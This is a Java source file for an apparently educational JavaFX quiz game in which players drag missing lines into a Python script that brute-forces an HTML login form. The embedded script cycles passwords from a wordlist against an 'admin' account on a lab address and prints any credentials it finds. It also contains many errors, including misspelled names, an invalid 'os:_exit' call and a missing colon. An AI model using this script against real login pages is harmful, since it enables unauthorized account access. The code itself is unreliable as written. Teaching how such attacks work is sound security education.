package Controller;

import javafx.application.Application;
import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.input.*;
import javafx.scene.layout.*;
import javafx.scene.text.Text;
import javafx.stage.Modality;
import javafx.stage.Stage;

import java.io.File;
import java.io.FileNotFoundException;
import java.net.URL;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SimulationPageController extends Navigation implements Initializable {

    //    private String ANSWER_FILELOC = "src/BruteForceCode/answer.txt";
//    private String HTML_FILELOC = "src/BruteForceCode/htmlBruteForce.txt";
//    private String PYTHON_FILELOC = "src/BruteForceCode/pythonBruteForce.txt";
    private String BLANK_ANSWER_SPACE = "_______________________________________________";
    private int SCORE_DIALOG_WIDTH = 800;
    private int SCORE_DIALOG_HEIGHT = 400;

    @FXML
    private ToggleButton btnBack;
    @FXML
    private ToggleButton btnRetry;
    @FXML
    private Button btnRunCode;
    @FXML
    private Button btnExit;
    @FXML
    private VBox vBoxHtml;
    @FXML
    private VBox vBoxPython;
    @FXML
    private VBox vBoxAnswerContainer;

    private List<String> listAnswers;//read from answer.txt
    private Map<Integer, Label> mapLblAnswer;// contain lineNumber and the text of the line, ex. 20. print("Tester")

    @Override
    public void initialize(URL location, ResourceBundle resources) {
        listAnswers = getAnswerFromFile();
        mapLblAnswer = new HashMap<>();
        readTextFromFileAndAppendToPane(vBoxHtml, getHtmlData());
        readTextFromFileAndAppendToPane(vBoxPython, getPythonData());

        for (Label answer :  //populate the right side with answer label with drag-n-drop event and styling
                mapLblAnswer.values()) {
            answer.setWrapText(true);
            answer.setPadding(new Insets(5, 5, 5, 5));
            answer.minWidthProperty().bind(vBoxAnswerContainer.widthProperty());
            answer.setStyle("-fx-border-width: 3px; -fx-border-color: #FF5959; -fx-text-fill: #FF5959; -fx-font-size: 18px;");
            answer.setOnDragDetected(event -> {//allocate drag event for the answer label
                Dragboard dragboard = answer.startDragAndDrop(TransferMode.ANY);
                ClipboardContent clipboardContent = new ClipboardContent();
                clipboardContent.putString(answer.getText());
                dragboard.setContent(clipboardContent);
                event.consume();
            });
            vBoxAnswerContainer.getChildren().add(answer);
        }

        Timer timer = new java.util.Timer();

        timer.schedule(new TimerTask() {
            public void run() {
                Platform.runLater(new Runnable() {
                    public void run() {
                        instructionPopUp();
                    }
                });
            }
        }, 1000);

    }

    private boolean isAllBlankAnswer() {
        Pattern pattern = Pattern.compile("([\"'])(\\\\?.)*?\\1");//get label text from node
        Matcher m = pattern.matcher(vBoxPython.getChildren().toString());
        while (m.find()) {
            String line = m.group(0).replace("'", "");
            line = line.replace("\t", "");
            if (line.equals("_______________________________________________"))
                return false;
        }
        return true;
    }


    private int getNumberOfCorrectAnswer() {//return the number of correctly drag-n-drop user input
        int correct = 0;
        Pattern pattern = Pattern.compile("([\"'])(\\\\?.)*?\\1");//get label text from node
        Matcher m = pattern.matcher(vBoxPython.getChildren().toString());
        int lineCount = 0;
        while (m.find()) {
            String line = m.group(0).replace("'", "");
            line = line.replace("\t", "");
            if (mapLblAnswer.keySet().contains(lineCount)) {//check if the line(label) number is the answer line
                System.out.println("Matches: " + line);
                System.out.println("Matches: " + mapLblAnswer.get(lineCount).getText());
                if (mapLblAnswer.get(lineCount).getText().equals(line)) {//check if user answer is the same as the given answer
                    System.out.println("Matches: " + line);
                    correct++;
                }
            }
            lineCount++;
        }
        return correct;
    }

    //read from a text file and populate the Vbox pane with label for each line in the text file
    private void readTextFromFileAndAppendToPane(VBox pane, List<String> arrayOfCodeLine) {
        int tabCount;
        int lineCount = 0;
        for (int x = 0; x < arrayOfCodeLine.size(); x++) {
            String line = arrayOfCodeLine.get(x);
            String lineWithoutTab = line.replace("\t", "");

            if (listAnswers.contains(lineWithoutTab)) {//find if answer is in the pythonBruteForce.txt, if it's replace it with BLANK_ANSWER_SPACE
                StringBuilder sbBlankAnswer = new StringBuilder();
                tabCount = 0;
                mapLblAnswer.put(lineCount, new Label(lineWithoutTab)); // to populate the right container with answer label
                Pattern tabPattern = Pattern.compile("[\t]");
                Matcher m = tabPattern.matcher(line);

                while (m.find()) tabCount++;
                for (int i = 0; i < tabCount; i++) sbBlankAnswer.append("\t");

                sbBlankAnswer.append(BLANK_ANSWER_SPACE);
                Label lblAnswerBlank = new Label(sbBlankAnswer.toString());
                lblAnswerBlank.setStyle("-fx-text-fill: #4C9DA6");
                lblAnswerBlank.setUserData(lineCount + "," + lineWithoutTab);

                lblAnswerBlank.setOnDragOver(event -> {     //drag-over Event for the blank label
                    if (event.getGestureSource() != mapLblAnswer && event.getDragboard().hasString()) {
                        event.acceptTransferModes(TransferMode.ANY);
                    }
                    event.consume();
                });
                lblAnswerBlank.setOnDragDropped(event -> {      //on drag drop, set the underline to the dragged item text
                    Dragboard db = event.getDragboard();
                    if (db.hasString()) {
                        lblAnswerBlank.setText(sbBlankAnswer.toString().replace(BLANK_ANSWER_SPACE, db.getString()));
                    }
                });
                pane.getChildren().add(lblAnswerBlank);
            } else {
                pane.getChildren().add(new Label(line));
            }
            lineCount++;
        }
    }

    private List<String> getAnswerFromFile() {//populate the lis with lines from answer.txt
        List<String> listStr = new ArrayList<>();
//        try{
//            Scanner sc = new Scanner(new File(ANSWER_FILELOC));
//            while (sc.hasNextLine()){
//                listStr.add(sc.nextLine());
//            }
//        }catch (FileNotFoundException ex){
//            System.out.println("answer.txt not found");
//            ex.printStackTrace();
//        }
        listStr.add("urllib.request.install_opener(opener)");
        listStr.add("parsed_html = BruteParser()");
        listStr.add("parsed_html.feed(page)");
        listStr.add("brute_force_parsed_html = BruteParser()");
        listStr.add("brute_force_parsed_html.feed(brute_force_page)");
        listStr.add("html_brute_forcer_thread = threading.Thread(target=self.html_brute_forcer)");
        return listStr;
    }

    @FXML
    private void btnBackPressed(ActionEvent actionEvent) {
        closeCurScene(actionEvent);
        loadStage("/Fxml/MainMenyPage.fxml", actionEvent);
    }

    @FXML
    private void btnRetryPressed(ActionEvent actionEvent) {
        closeCurScene(actionEvent);
        loadStage("/Fxml/SimulationPage.fxml", actionEvent);
    }

    @FXML
    private void btnRunCodePressed(ActionEvent actionEvent) {
        if (isAllBlankAnswer())
            showScoreDialog(actionEvent);
        else
            showAlertDialog();
    }

    private void showScoreDialog(ActionEvent actionEvent) {//pop-up a score dialog to show score based on user drag-n-drop input
        final Stage dialog = new Stage();
        dialog.setResizable(false);
        dialog.initModality(Modality.APPLICATION_MODAL);
        BorderPane dialogBorderPane = new BorderPane();

        Text txtPreScore = new Text("YOU HAVE SCORED");
        Text txtScore = new Text(String.valueOf(getNumberOfCorrectAnswer()));
        Text txtPostScore = new Text(" OUT OF " + mapLblAnswer.size() + " QUESTIONS RIGHT");

        txtPreScore.setStyle("-fx-font-family: Abel; -fx-text-fill: #393D46; -fx-font-size: 24px");
        txtPostScore.setStyle("-fx-font-family: Abel; -fx-text-fill: #393D46; -fx-font-size: 24px;");
        txtScore.setStyle("-fx-font-family: Abel; -fx-text-fill: #4C9DA6; -fx-font-size: 24px;");

        HBox scoreHBox = new HBox(txtScore, txtPostScore);
        scoreHBox.setAlignment(Pos.CENTER);
        Label lblDesc1 = new Label();
        Label lblDesc2 = new Label();
        Label lblDesc3 = new Label();
        lblDesc1.setText("PLEASE REFER TO  ");
        lblDesc2.setText("BRUTE-FORCING HTML AUTHENTICATION FORM");
        lblDesc3.setText("ARTICLE ON OUR WEBSITE");

        lblDesc1.setStyle("-fx-text-fill: #393D46; -fx-font-size: 18px;");
        lblDesc2.setStyle("-fx-text-fill: #393D46; -fx-font-size: 18px;-fx-font-weight: bold;");
        lblDesc3.setStyle("-fx-text-fill: #393D46; -fx-font-size: 18px;");

        VBox vBoxDesc = new VBox(lblDesc1, lblDesc2, lblDesc3);
        vBoxDesc.setAlignment(Pos.CENTER);
        vBoxDesc.setPadding(new Insets(30, 0, 0, 0));

        Button btnMainMenu = new Button("MAIN MENU");
        btnMainMenu.setOnMouseClicked(event -> {
            dialog.close();
            closeCurScene(actionEvent);
            loadStage("/Fxml/MainMenuPage.fxml", actionEvent);
        });

        VBox centerVbox = new VBox(txtPreScore, scoreHBox, vBoxDesc);
        centerVbox.setAlignment(Pos.CENTER);
        centerVbox.setPadding(new Insets(50, 20, 50, 20));
        centerVbox.setSpacing(5);
        dialogBorderPane.setTop(centerVbox);
        dialogBorderPane.setStyle("-fx-background-color: #FFAD5B");

        HBox btnPaneContainer = new HBox();
        btnPaneContainer.setAlignment(Pos.BOTTOM_RIGHT);
        btnPaneContainer.setPadding(new Insets(5, 5, 5, 5));
        btnPaneContainer.minWidth(dialogBorderPane.getWidth());
        btnPaneContainer.getChildren().add(btnMainMenu);
        dialogBorderPane.setBottom(btnPaneContainer);

        Scene dialogScene = new Scene(dialogBorderPane, SCORE_DIALOG_WIDTH, SCORE_DIALOG_HEIGHT);
        dialog.setScene(dialogScene);
        dialog.show();
    }

    private void showAlertDialog() {
        Alert alert = new Alert(Alert.AlertType.ERROR);
        alert.setTitle("ERROR");
        alert.setContentText("PLEASE FILL IN ALL THE BLANK BEFORE SUBMITTING YOUR ANSWER");
        alert.showAndWait();
    }

    private void instructionPopUp(){
        Alert alert = new Alert(Alert.AlertType.INFORMATION);
        alert.setTitle("INSTRUCTION");
        alert.setContentText("Drag and drop the snippets of code into the blanks provided to complete the Brute-Force code");
        alert.showAndWait();
    }

    @FXML
    private void btnExitPressed(ActionEvent actionEvent) {
        Platform.exit();
    }

    @FXML
    private void vBoxHtmlDragDrop(DragEvent dragEvent) {
    }

    @FXML
    private void vBoxHtmlDragOver(DragEvent dragEvent) {
    }

    private List<String> getHtmlData() {
        List<String> listHtml = new ArrayList<>();
        listHtml.add("<form class=\"form-signin\" action=\"./\" method=\"post\">");
        listHtml.add("\t<input type=\"text\" name=\"username\" placeholder=\"username\" required=\"\" autofocus=\"\">");
        listHtml.add("\t<input type=\"password\" name=\"password\" placeholder=\"password\" required=\"\">");
        listHtml.add("\t<button>Login </button>");
        listHtml.add("</form>");
        return listHtml;
    }

    private List<String> getPythonData() {
        List<String> listPython = new ArrayList<>();
        listPython.add("from html.parser import HTMLparser");
        listPython.add("import urllib.request");
        listPython.add("import urllib.parse");
        listPython.add("import http.cookiejar");
        listPython.add("import queue");
        listPython.add("import threading");
        listPython.add("import sys");
        listPython.add("import os");
        listPython.add("");
        listPython.add("threads = 5");
        listPython.add("resume_word = None");
        listPython.add("username = \"admin\"");
        listPython.add("headers = {}");
        listPython.add("target_url = \"http://10.0.0.4:9001/login/\"");
        listPython.add("post_url = \"http://10.0.0.4:9001/login/");
        listPython.add("username_field = \"username\"");
        listPython.add("password_field = \"password\"");
        listPython.add("");
        listPython.add("def build_password_q(passwd_file):");
        listPython.add("\tfd = open(passwd_file, \"rb\")");
        listPython.add("\tpasswd_list = fd.readlines()");
        listPython.add("\tfd.close()");
        listPython.add("");
        listPython.add("\tpasswd_q = queue.Queue()");
        listPython.add("\tif len(passwd_list):");
        listPython.add("\t\tif not resume_word:");
        listPython.add("\t\t\tfor passwd in passwd_list:");
        listPython.add("\t\t\t\tpasswd = passwd.decode(\"utf-8\").rstrip()");
        listPython.add("\t\t\t\tpasswd.q.put(passwd)");
        listPython.add("\t\telse:");
        listPython.add("\t\t\tresume_found = False");
        listPython.add("\t\t\tfor passwd in passwd_list:");
        listPython.add("\t\t\t\tpasswd = passwd.decode(\"utf-8\").rstrip()");
        listPython.add("\t\t\t\tif passwd == resume_word:");
        listPython.add("\t\t\t\t\tresume_found = True");
        listPython.add("\t\t\t\t\tpasswd_q.put(passwd)");
        listPython.add("\t\t\t\telse:");
        listPython.add("\t\t\t\t\tif resume_found:");
        listPython.add("\t\t\t\t\t\tpasswd_q.put(passwd)");
        listPython.add("\t\treturn passwd_q");
        listPython.add("");
        listPython.add("class BruteForcer():");
        listPython.add("\tdef _init_(self, username, passwd_q):");
        listPython.add("\t\tself.username = username");
        listPython.add("\t\tself.passwd_q = passwd_q");
        listPython.add("\t\tself.found = False");
        listPython.add("");
        listPython.add("\tdef html_brute_forcer(self):");
        listPython.add("\t\twhile not passwd_q.empty() and not self.found:");
        listPython.add("\t\t\tcookiejar = http.cookiejar.FileCookieJar(\"cookies\")");
        listPython.add("\t\t\topener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookiejar))");
        listPython.add("");
        listPython.add("\t\t\turllib.request.install_opener(opener)");
        listPython.add("");
        listPython.add("\t\t\trequest = urllib.request.Request(target_url, headers = headers)");
        listPython.add("\t\t\tresponse = urllib.request.urlopen(request)");
        listPython.add("");
        listPython.add("\t\t\tpage = str(response.read())[2:-1]");
        listPython.add("");
        listPython.add("\t\t\tparsed_html = BruteParser()");
        listPython.add("\t\t\tparsed_html.feed(page)");
        listPython.add("");
        listPython.add("\t\t\tif username_field in parsed_html.parsed_results.keys() and  password_field in parsed_html.parsed_results.keys():");
        listPython.add("\t\t\t\tparsed_html.parsed_results[username_field] = self.username");
        listPython.add("\t\t\t\tparsed_html.parsed_results[password_field] = self.passwd_q.get()");
        listPython.add("");
        listPython.add("\t\t\t\tprint(f\"[*] Attempting {self.username}/{parsed_html.parsed_results[password_field]}\")");
        listPython.add("");
        listPython.add("\t\t\t\tpost_data = urllib.parse.urlencode(parsed_html.parsed_results).encode()");
        listPython.add("");
        listPython.add("\t\t\t\tbrute_force_request = urllib.request.Request(post_url, headers = headers)");
        listPython.add("\t\t\t\tbrute_force_response = urllib.request.urlopen(brute_force_requst, data = post_data)");
        listPython.add("");
        listPython.add("\t\t\t\tbrute_force_page = str(brute_force_response.read())[2:-1]");
        listPython.add("");
        listPython.add("\t\t\t\tbrute_force_parsed_html = BruteParser()");
        listPython.add("\t\t\t\tbrute_force_parsed_html.feed(brute_force_page)");
        listPython.add("");
        listPython.add("\t\t\t\tif not brute_force_parsed_html.parsed_results:");
        listPython.add("\t\t\t\t\tself.found = True");
        listPython.add("\t\t\t\t\tprint(\"[*] Brute Force Attempt is successful\")");
        listPython.add("\t\t\t\t\tprint(f\"[*] Username: {self.username}\")");
        listPython.add("\t\t\t\t\tprint(f\"[*] Password: {parsed_html.parsed_results[password_field]}\")");
        listPython.add("\t\t\t\t\tos:_exit(0)");
        listPython.add("\t\t\telse:");
        listPython.add("\t\t\t\tprint(\"HTML Page is Invalid\")");
        listPython.add("\t\t\t\tbreak");
        listPython.add("");
        listPython.add("\tdef html_brute_forcer_thread_starter(self):");
        listPython.add("\t\tprint(f\"[*] Brute Forcing with threads\")");
        listPython.add("\t\tfor i in range(threads):");
        listPython.add("\t\t\thtml_brute_forcer_thread = threading.Thread(target=self.html_brute_forcer)");
        listPython.add("\t\t\thtml_brute_forcer_thread.start()");
        listPython.add("");
        listPython.add("class BruteParser(HTMLParser):");
        listPython.add("\tdef _init_(self):");
        listPython.add("\t\tHTMLParser._init_(self)");
        listPython.add("\t\tself.parsed_results = {}");
        listPython.add("");
        listPython.add("\tdef handle_starttag(self, tag, attrs):");
        listPython.add("\t\tif tag == \"input\"");
        listPython.add("\t\t\tfor name, value in attrs:");
        listPython.add("\t\t\t\tif name == \"name\" and value == username_field:");
        listPython.add("\t\t\t\t\tself.parsed_results[username_field] = username_field");
        listPython.add("\t\t\t\tif name == \"name\" and value == password_field:");
        listPython.add("\t\t\t\t\tself.parsed_results[password_field] = password_field");
        listPython.add("");
        listPython.add("print(\"[*] Started HTML Form Brute Forcer Script\")");
        listPython.add("print(\"[*] Building Password Queue\")");
        listPython.add("passwd_q = build_passwd_q(\"passwd.txt\")");
        listPython.add("if passwd_q.qsize():");
        listPython.add("\tprint(\"[*] Password Queue Build Successful\")");
        listPython.add("\tattempt_brute_force = BruteForcer(\"admin\", passwd_q)");
        listPython.add("\tattempt_bruce_force.html_brute_forcer_thread_starter()");
        listPython.add("else:");
        listPython.add("\tprint(\"[!] Empty Password File\")");
        listPython.add("\tsys.exit(0)");
        return listPython;
    }
}
